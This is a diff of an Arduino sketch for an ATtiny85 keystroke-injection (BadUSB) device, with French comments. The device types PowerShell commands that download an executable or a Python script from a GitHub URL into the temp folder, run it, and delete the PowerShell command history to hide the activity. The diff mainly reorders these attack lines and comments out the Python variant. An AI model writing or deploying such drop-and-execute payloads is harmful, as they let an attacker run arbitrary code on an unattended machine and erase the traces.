@@ -36,11 +36,16 @@ void loop() {
 
     // Récupère un script sur internet et l'exécute
     // Version C#
-    DigiKeyboardFr.print("powershell -WindowStyle Hidden -Command \"iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.exe -OutFile $env:TEMP\\TryCatchMe.exe; Start-Process $env:TEMP\\TryCatchMe.exe; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit\"");
-    // Version python
-    //DigiKeyboardFr.print("Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\"'; exit");
+    DigiKeyboardFr.print("iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.exe -OutFile $env:TEMP\\TryCatchMe.exe; Start-Process $env:TEMP\\TryCatchMe.exe; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit");
     DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
     DigiKeyboardFr.delay(500);
+
+    /*
+    // Version python
+    DigiKeyboardFr.print("if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit");
+    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
+    DigiKeyboardFr.delay(500);
+    */
 
     // Fait clignoté la LED pour indiquer que c'est terminé
     for (int i = 0; i < 3; i++) {
